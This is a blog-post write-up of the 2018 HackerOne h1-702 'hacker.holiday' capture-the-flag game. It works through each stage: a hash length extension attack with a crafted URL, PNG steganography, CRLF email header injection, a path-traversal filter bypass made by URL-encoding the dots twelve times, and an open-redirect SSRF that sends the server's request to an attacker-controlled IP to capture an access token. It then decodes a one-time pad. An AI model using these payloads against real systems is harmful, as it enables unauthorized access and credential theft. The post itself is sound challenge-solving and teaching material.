---
layout: post
title:  "hackerone holiday game write-up"
date:   2018-08-15 17:17:08 -0700
categories: ctf hackerone
---

If you attended the Las Vegas security conferences in August 2018 you probably couldn't miss the hackerone game for the h1-702 event. This flyer was all around BSides and DEFCON:

![flyer](/assets/img/hacker-holiday-2018/flyer.jpg)

## The beginning

The hostname on the card is ```atvdxk.ahebwtr```, using ROT7 this translates to ```hacker.holiday```. The game seems to start at [https://hacker.holiday/](https://hacker.holiday/){:target="_blank"}

There are 7 pink squares in the top left corner, not sure if that's a hint, maybe? :-)

The game further consists of several parts, quick jump links:

* [Hash length extension attack](#hash-length-extension-attack)
* [Steganography](#steganography)
* [E-mail header injection](#e-mail-header-injection)
* [Server Side Request Forgery](#server-side-request-forgery)
* [Text cipher](#text-cipher)

## Hash length extension attack

The website is very basic, the first (obvious) file to display is ```rules.txt``` at [https://hacker.holiday/?file=rules.txt](https://hacker.holiday/?file=rules.txt){:target="_blank"}:

![rules.txt](/assets/img/hacker-holiday-2018/rules.txt.png)


Trying to browse different (non-existent) files, e.g.: [https://hacker.holiday/?file=nonexistent](https://hacker.holiday/?file=nonexistent){:target="_blank"} shows:

```
Error: Invalid file name. 
DEBUG mode is currently disabled.
```

Debug mode, hmm, first wild guess of appending ```debug=1``` to the URL actually works :)

[https://hacker.holiday/?file=nonexistent&debug=1](https://hacker.holiday/?file=nonexistent&debug=1){:target="_blank"} shows:


![alt-hash.png](/assets/img/hacker-holiday-2018/alt-hash.png)

Interesting, this reveals a file ```next.207``` is present and some kind of a hash for ```rules.txt```, the title for ```next.207``` is ```hash: ???```.

Trying to load ```next.207``` file errors out with ```No hash specified```, so another wild guess of appending a ```hash``` parameter leads to: [https://hacker.holiday/?file=next.207&hash=asdf](https://hacker.holiday/?file=next.207&hash=asdf){:target="_blank"}

![invalid-hash.png](/assets/img/hacker-holiday-2018/invalid-hash.png)

Considering the help on the bottom of the page a hash length extension attack seems viable. To make work easier the [hash_extender](https://github.com/iagox86/hash_extender) tool was used.

The hash is 40 characters long, which seems to correspond with sha1. After a bit of trial and error a secret of length 16 was discovered:

```bash
$ ./hash_extender -d rules.txt -s 266b99aac278c0fd7be8a55025ba8afc854c88da -a next.207 -f sha1 -l 16 --out-data-format=html
Type: sha1
Secret length: 16
New signature: fde7f5100bbe028edb4c6c971afab98eeecf0ac2
New string: rules%2etxt%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8next%2e207
$
```

File ```next.207``` can be accessed like this: ```https://hacker.holiday/?file=rules%2etxt%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8next%2e207&hash=fde7f5100bbe028edb4c6c971afab98eeecf0ac2```

![next.207.png](/assets/img/hacker-holiday-2018/next.207.png)

## Steganography

The data are saved into a file using hex editor, the file was examined and it looks a lot like a PNG file (```pHYs```, ```IHDR``` and other chunks name are present) but the file is not recognized as such. It seems the first 4 bytes are zeros instead of a valid PNG header. They are put back from a different PNG file - ```89 50 4E 47```. The file is now a valid PNG image:

![next.207-fixed.png](/assets/img/hacker-holiday-2018/next.207-fixed.png)

There is a weird white bar on the top of the image, I first thought this was some kind of data corruption but it is actually supposed to be like that. I tried a couple tools, after a few of them I found **stegsolve** makes it easy to browse through different filters and discover the next step, sub-directory of ```/admin!31337/```.

![next.207-stegsolve.png](/assets/img/hacker-holiday-2018/next.207-stegsolve.png)

### E-mail header injection

So here we are at [https://hacker.holiday/admin!31337/](https://hacker.holiday/admin!31337/){:target="_blank"}. Admin login form is shown, doesn't seem to be vulnerable to SQLi. The forget password functionality looks interesting, it requires a domain of ```@hacker.1```:

![forgot-password.png](/assets/img/hacker-holiday-2018/forgot-password.png)

This asks for a header injection. I made an assumption (NEVER do that, it's a horrible idea :-)) that the e-mail must end with ```hacker.1``` domain and kept trying to inject something at the beginning of the input. One could argue this would work in a real header injection vulnerability but hey, don't make assumptions. The injection only works at the end of the input, posting data like this:

```
email=asdf@hacker.1%0d%0aCc: lukash@backstep.net
```

results in the web application saying:

![header-injection.png](/assets/img/hacker-holiday-2018/header-injection.png)

### Server Side Request Forgery

New sub-directory is [https://hacker.holiday/admin!31337/el337er/](https://hacker.holiday/admin!31337/el337er/){:target="_blank"}.

![el337er.png](/assets/img/hacker-holiday-2018/el337er.png)

The [robots.txt](https://hacker.holiday/robots.txt){:target="_blank"} file reveals the [flag.php](https://hacker.holiday/flag.php){:target="_blank"} script that cannot be accessed (```MISSING ACCESS TOKEN```).

The script ```image.php```  seems like it is accessing ```https://hacker.holiday/admin!31337/el337er/<value of $u>``` over HTTP, so it's a simple SSRF vulnerability. Or is it?

Well, not really. Trying to access ```flag.php``` like this: [https://hacker.holiday/admin!31337/el337er/image.php?u=../../flag.php](https://hacker.holiday/admin!31337/el337er/image.php?u=../../flag.php){:target="_blank"} does not work (```Hacking attempt! Only three . allowed.```). There are 2 ways I know of to bypass the "hacking filter" :-)

#### Url-encoding headache

I only actually learned about this after completing the game when I discussed it with a fellow hacker at the h1-702 event (thanks Sam!).

I tried url encoding the dots once, twice and a couple times, it didn't seem to help. So I assumed (again, NEVER do that, it's horrible!) there must be a url decode in a loop that just goes on until there is no more url encoding. Nope.

Encoding the dots **12 times** does the trick:

```
https://hacker.holiday/admin!31337/el337er/image.php?u=%25252525252525252525252E%25252525252525252525252E/%25252525252525252525252E%25252525252525252525252E/flag.php
```

Lesson learned, if url encoding 5 times doesn't help don't give up, more encoding is always better, lol.

#### Open redirect

I thought of a ```logout.php``` script from previous step that had an open redirect vulnerability in it and tried to utilize it but have not found a way of traversing up to get to the ```flag.php``` using only three dots.

Quite a few beers later I came up with a way of redirecting out of the server without using any more dots (as 3 dots are needed to get one level up to ```logout.php```):

```
GET /admin!31337/el337er/image.php?u=../logout.php?r=http://0x01020304
```

```0x01020304``` being encoded IP of a server that I control (1.2.3.4 for this example). The ```image.php``` tries to initiate a GET request towards that:

```
GET /flag.php HTTP/1.1
Host: hacker.holiday
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
FLAG-ACCESS-TOKEN: h4ckth3pl4n3t
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

This reveals the ```FLAG-ACCESS-TOKEN: h4ckth3pl4n3t```. Accessing ```flag.php``` with the right header shows the content:

```
<h1>Access granted!</h1><p>Welcome to the end of your journey, remember where it all began...</p><p>GQMYJSGPSMGZRDDQNFBLZFGSDLWQMOPRSZRQAGOLQKWSRPSRZEAEDAQAFWPZ</p><p>(This is not the flag, you still have one final step to go!)</p><!-- http://rumkin.com/tools/cipher/ -->
```

## Text Cipher

Using the string from the answer (```GQMYJSGPSMGZRDDQNFBLZFGSDLWQMOPRSZRQAGOLQKWSRPSRZEAEDAQAFWPZ```) and the string on the paper card (```KCMGUACPFFZNARLDGMFLSMGUNPNTAHWFDHUQYCWEXGEFETJTGMCOHNTISJTQ```) I started looking for an algo to decrypt the final message. Luckily I noticed the HTML comment in the response otherwise this would have taken a lot more time :-)

A bit of manual bruteforcing and the algorithm was found here: [http://rumkin.com/tools/cipher/otp.php](http://rumkin.com/tools/cipher/otp.php){:target="_blank"}

The decrypted answer is:

```
EMAILIWANTTOJOINTHEATHACKERDOTHOLIDAYWITHWINNERCHICKENDINNER
```

Voila. h1-702 hackathon was a lot of fun. Looking forward to next year ;)